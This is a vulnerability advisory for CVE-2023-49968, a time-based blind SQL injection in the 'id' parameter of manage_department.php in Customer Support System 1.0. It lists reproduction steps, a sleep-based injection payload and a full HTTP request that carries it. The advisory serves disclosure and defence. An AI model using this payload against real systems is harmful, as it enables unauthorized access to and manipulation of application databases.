# CVE-2023-49968
# Customer Support System 1.0 - SQL Injection Vulnerability in manage_department.php via "id" URL Parameter

**Description**: A SQL Injection vulnerability exists in version 1 of the Customer Support System. An attacker with malicious intent can execute SQL commands on the MySQL database by manipulating the 'id' URL parameter while editing a department.
  
**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49968     
**Tested on**: Windows  
### Steps to reproduce:  
1- Log in to the application.  
2- Navigate to the department editing page, click the "Action" button, and select "Edit".  
3- The 'id' parameter will be passed, allowing the insertion of a malicious payload. 
**payload**: (select*from(select(sleep(5)))a)  
### Request:

```
GET /customer_support/manage_department.php?id=(select*from(select(sleep(5)))a) HTTP/1.1
Host: 192.168.68.182
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://192.168.68.182/customer_support/index.php?page=department_list
Cookie: PHPSESSID=arlocktakq815fq1lpm5fjml9n
```
Discoverer(s)/Credits:  
Geraldo Alcântara
